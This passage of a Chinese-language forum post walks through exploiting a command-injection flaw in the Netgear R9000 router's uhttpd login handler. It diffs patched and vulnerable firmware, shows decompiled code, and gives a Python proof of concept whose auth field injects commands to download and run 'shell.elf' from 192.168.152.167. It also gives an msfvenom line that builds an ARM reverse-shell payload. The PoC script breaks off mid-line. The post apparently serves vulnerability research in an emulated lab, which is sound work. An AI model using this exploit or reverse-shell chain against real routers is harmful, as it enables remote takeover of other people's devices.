
[href="forum.php?mod=attachment&aid=MjY0NzI1OXw1NzdhZmYxNnwxNzkzNTczMDg2fDE2ODA4NnwxODQxMTg3&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0NzI1OXw1NzdhZmYxNnwxNzkzNTczMDg2fDE2ODA4NnwxODQxMTg3&nothumb=yes)

10

2023-10-6 23:58 上传

查看 `start()` 函数中利用的 `/www/cgi-bin/uhttpd.sh` 脚本。发现启动命令为 `$UHTTPD_BIN -h /www -r ${REALM}  -x /cgi-bin -t 70 -p 0.0.0.0:80 -C /etc/uhttpd.crt -K /etc/uhttpd.key -s 0.0.0.0:443`，其中 `REALM = R9000`，`UHTTPD_BIN = /usr/sbin/uhttpd`。我们无需开启 https，所以启动命令为 `/usr/sbin/uhttpd -h /www -r R9000 -x /cgi-bin -t 70 -p 0.0.0.0:80`。

## 4. 逆向分析

```
wget https://www.downloads.netgear.com/files/GDC/R9000/R9000-V1.0.4.28.zip
```

获取修复版本的固件。因为源码较为繁杂，我们通过 `Bindiff` 进行二进制比对，来查找漏洞点。

![](https://attach.52pojie.cn/forum/202310/06/235900jyysee4ajep3a79a.png)

`image-20231006231411605.png` (42.33 KB, 下载次数: 0)

[href="forum.php?mod=attachment&aid=MjY0NzI2MHxjOTFlMTAxZnwxNzkzNTczMDg2fDE2ODA4NnwxODQxMTg3&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0NzI2MHxjOTFlMTAxZnwxNzkzNTczMDg2fDE2ODA4NnwxODQxMTg3&nothumb=yes)

11

2023-10-6 23:59 上传

`shift+D` 选取修复版本的 `/usr/sbin/uhttpd` 文件即可，主要查看登录验证的 `uh_cgi_auth_check()` 函数。

```
  memset(s, 0, 0x1000u);
  v14 = strlen(v13);
  uh_b64decode(s, 0xFFF, v13 + 6, v14 - 6);
  v15 = strchr(s, ':');
  if ( !v15 )
  {
LABEL_32:
    v16 = 0;
    v17 = 0;
    goto LABEL_15;
  }
  v16 = v15 + 1;
  *v15 = 0;
  if ( v15 != (char *)0xFFFFFFFF )
  {
    snprintf(command, 0x80u, "/usr/sbin/hash-data -e %s >/tmp/hash_result", v15 + 1);
    system(command);
    v3 = cat_file(73805);
  }
  v17 = s
```

漏洞版本 `base64` 解密后 `snprintf()` 后直接传给 `system()` 执行，这里会把 `v15`（`:`）后面的内容放到 `%s` 处，记得加 `\n` 来执行多条指令。

```
  memset(s, 0, 0x1000u);
  v15 = strlen(v14);
  uh_b64decode(s, 4095, v14 + 6, v15 - 6);
  v16 = strchr(s, 58);
  if ( !v16 )
  {
LABEL_15:
    v17 = 0;
    v18 = 0;
    goto LABEL_16;
  }
  v17 = v16 + 1;
  *v16 = 0;
  if ( v16 != (char *)-1 )
  {
    v18 = s;
    dni_system("/tmp/hash_result", 0, 0, "/usr/sbin/hash-data", "-e", v17, 0);
    v19 = cat_file("/tmp/hash_result");
    goto LABEL_17;
  }
```

而修复版本则利用 `dni_system()` 执行，只可控参数。

## 4. 获取权限

### POC

```
#!/usr/bin/python3

from pwn import *

import requests

import base64

cmd  = 'admin:'

cmd += '`'

cmd += 'wget http://192.168.152.167:8000/shell.elf\n'

cmd += 'chmod 777 ./shell.elf\n'

cmd += './shell.elf\n'

cmd += '`'

assert(len(cmd) 
```

```
msfvenom -p linux/armle/shell_reverse_tcp LHOST=192.168.152.167 LPORT=10086 -f elf > shell.elf
```

利用 `msf` 生成对应架构的木马程序，然后在 `shell.elf` 所在的目录开启http服务，利用漏洞将木马程序下载下来。

![](https://attach.52pojie.cn/forum/202310/06/235938w0kxvxtgtv6kyzot.png)

`image-20231006233741185.png` (102.96 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY0NzI2MXw3NDZmNWU1NHwxNzkzNTczMDg2fDE2ODA4NnwxODQxMTg3&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0NzI2MXw3NDZmNWU1NHwxNzkzNTczMDg2fDE2ODA4NnwxODQxMTg3&nothumb=yes)

12

2023-10-6 23:59 上传

启动监听，并执行 `exp.py`。

![](https://attach.52pojie.cn/forum/202310/07/000006ajqoehy89dfuu9yz.png)

`image-20231006234357194.png` (52.31 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY0NzI2Mnw1ZWVlMzhiZXwxNzkzNTczMDg2fDE2ODA4NnwxODQxMTg3&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0NzI2Mnw1ZWVlMzhiZXwxNzkzNTczMDg2fDE2ODA4NnwxODQxMTg3&nothumb=yes)

13

2023-10-7 00:00 上传

成功获取 shell，我们利用获取的权限在 `www` 目录创建 `flag.txt` 文件然后访问它。

![](https://attach.52pojie.cn/forum/202310/07/000020czqq4yqz431hz33r.png)

`image-20231006234709504.png` (19.78 KB, 下载次数: 1)

[href="forum.php?mod=attachment&aid=MjY0NzI2M3wwNmEwYTEyY3wxNzkzNTczMDg2fDE2ODA4NnwxODQxMTg3&nothumb=yes" target="_blank"](https://www.52pojie.cn/forum.php?mod=attachment&aid=MjY0NzI2M3wwNmEwYTEyY3wxNzkzNTczMDg2fDE2ODA4NnwxODQxMTg3&nothumb=yes)

14

2023-10-7 00:00 上传

成功创建。
